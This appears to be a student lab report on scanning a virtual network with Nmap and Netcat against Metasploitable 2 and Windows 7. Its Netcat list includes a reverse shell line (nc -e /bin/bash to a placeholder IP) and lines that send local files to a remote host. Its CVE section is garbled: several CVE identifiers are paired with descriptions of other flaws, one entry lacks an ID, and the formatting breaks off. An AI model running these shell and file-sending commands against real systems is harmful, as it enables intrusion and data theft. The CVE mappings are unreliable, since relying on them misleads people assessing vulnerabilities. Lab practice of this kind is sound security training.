# üìù Active Information Gathering

## Summary
&emsp;&emsp;&emsp;The report talks about the results taken from running active information gathering using simulated environments. The virtual environments used are Kali, Windows 7 and Metasploitable 2 which are all under one network. To scan the networks for vulnerabilities, the tools used are NetCat and NMAP. Netcat, also known as nc, is a command-line tool used for networking and security purposes. It allows users to create and interact with TCP and UDP connections over the network. Nmap is a popular command-line tool used for network exploration and security auditing. It is designed to scan and map networks, identify open ports and services, and detect potential vulnerabilities.

&emsp;&emsp;&emsp;Using NetCat and NMAP exposed vulnerabilities and security issues on specific ports. Descriptions are indicated with the results after the scan was conducted. CVEs appear in some of the results which help in determining the issues quickly. CVE (Common Vulnerabilities and Exposures) is a standardized system for identifying and naming cybersecurity vulnerabilities. Each CVE identifier represents a unique vulnerability or security exposure that has been assigned a specific identifier number. Knowing the CVE helps in easily identifying the issue needed to immediately remediate to avoid certain impacts to organizations and businesses such as their legal liabilities, financial loses, reputation, operation disruptions and compliance issues.

## Methodology

| Virtual Machine | Windows 7 | Kali Linux | Metasploitable 2 |
| ------------- | ------------- | ------------- | ------------- |
| IP Address | 192.168.56.101 | 192.168.56.102 | 192.168.56.103 |

| Default Gateway | 192.168.56.1 | 192.168.56.1 | 192.168.56.1 |

#### NMAP
- ***nmap [IP address]*** - To find which ports are active
- ***nmap -p [port numbers] [IP address]*** - To find which ports from 1-1000 are open
- ***nmap -sV --script vuln [IP address]*** - To scan for vulnerabilities
- ***nmap 192.168.56.0/24***

    ```
#### NetCat
- ***nc -zv [IP address] 1-1000*** - To perform a port scan on the specified IP address from port 1-1000
- ***nc -w 3 [IP address] 5555 < localfile.txt*** - Send the contents of ***localfile.txt*** to a remote machine with the specified IP address using port 5555. The -w 3 option sets a timeout of 3 seconds for the connection attempt.
- ***echo "Hello, World!" | nc [IP address] 1234*** - Sends "Hello, World!" to the specified IP in port 1234.
- ***nc -e /bin/bash [IP address] 1234*** - This executes the bash shell and sends the output to the local machine listening on port 1234
- ***nc [IP address] 1234 < file_to_send.txt*** - The command sends a ***file_to_send.txt*** to a specific IP on port 1234

       CVE-2017-16995: 
         The NFSv2/NFSv3 server in the nfsd subsystem in the Linux kernel through 4.15. 
         allows remote attackers to cause a denial of service (system crash) 
         because a length field is not validated in XDR requests to 
         NFSv2/v3 write arguments, related to fs/nfsd/nfs3xdr.c and fs/nfsd/nfsxdr.c.
       CVE-2018-16884: 
         In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map_write() 
         in kernel/user_namespace.c allows privilege escalation 
         because it mishandles nested user namespaces with more than 5 UID or GID ranges.
    _  CVE-2018-16885: 
         The do_xfs_setattr function in fs/xfs/xfs_ioctl.c in the Linux kernel 
         through 4.19.6 allows local users to cause a denial of service 
         (memory corruption and system crash) or possibly have unspecified 
         other impact by changing a certain XFS disk layout.

         The SMB server in Samba 3.0.0 through 3.0.25rc3 allows remote attackers 
         to execute arbitrary commands via a crafted packet that triggers 
         a heap-based buffer overflow in the (1) Samba daemon 
         process or (2) nmbd process.
    _  CVE-2017-7494: 
         Samba before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4 
         allows remote authenticated users to leverage access to an 
         SMB1 share to create a symlink file to any location on the 
         filesystem when the underlying filesystem does not support symlink creation, 
         and then manipulate the contents of a non-symlink file to create a 
         setuid binary file that results in elevated privileges for 
         a non-root user.
